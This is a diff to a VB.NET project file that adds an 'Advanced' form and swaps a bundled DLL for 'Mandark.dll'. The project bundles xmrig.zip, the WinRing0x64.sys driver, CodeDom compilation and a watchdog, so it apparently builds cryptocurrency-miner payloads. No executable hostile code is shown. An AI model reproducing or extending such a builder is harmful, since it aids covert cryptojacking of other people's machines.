@@ -119,6 +119,12 @@
     <Import Include="System.Xml.Linq" />
   </ItemGroup>
   <ItemGroup>
+    <Compile Include="Advanced.Designer.vb">
+      <DependentUpon>Advanced.vb</DependentUpon>
+    </Compile>
+    <Compile Include="Advanced.vb">
+      <SubType>Form</SubType>
+    </Compile>
     <Compile Include="Codedom.vb" />
     <Compile Include="Form1.vb">
       <SubType>Form</SubType>
@@ -154,6 +160,9 @@
     <None Include="Resources\xmrig.zip" />
   </ItemGroup>
   <ItemGroup>
+    <EmbeddedResource Include="Advanced.resx">
+      <DependentUpon>Advanced.vb</DependentUpon>
+    </EmbeddedResource>
     <EmbeddedResource Include="Form1.resx">
       <DependentUpon>Form1.vb</DependentUpon>
       <SubType>Designer</SubType>
@@ -192,13 +201,13 @@
     <None Include="Resources\WinRing0x64.sys" />
   </ItemGroup>
   <ItemGroup>
-    <None Include="Resources\Project1.dll" />
-  </ItemGroup>
-  <ItemGroup>
     <None Include="Resources\Program.cs" />
   </ItemGroup>
   <ItemGroup>
     <None Include="Resources\Watchdog.cs" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\Mandark.dll" />
   </ItemGroup>
   <Import Project="$(MSBuildToolsPath)\Microsoft.VisualBasic.targets" />
 </Project>
